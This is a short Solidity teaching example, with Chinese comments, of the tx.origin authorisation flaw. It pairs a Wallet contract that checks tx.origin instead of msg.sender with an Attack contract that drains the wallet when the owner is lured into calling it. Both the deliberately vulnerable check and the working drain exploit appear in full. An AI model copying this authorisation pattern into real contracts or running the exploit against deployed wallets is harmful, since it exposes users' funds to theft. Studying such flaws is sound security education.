```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Wallet {
    address public owner;

    event SubmitEvent(address addr, uint amount);

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address _to, uint amount) external {
        emit SubmitEvent(tx.origin, amount);
        //这里tx.origin时调用链头部的发起者，
        //Alice -> Attack.attack -> Wallet.transfer
        //tx.origin = Alice
        require(owner == tx.origin, "not owner");
        payable(_to).transfer(amount);
    }

    function getBalance() public returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    Wallet wallet;

    receive() external payable{}

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
    }

    function attack() public {
        wallet.transfer(address(this), address(wallet).balance);
    }

    function getBalance() public returns (uint) {
        return address(this).balance;
    }
}
```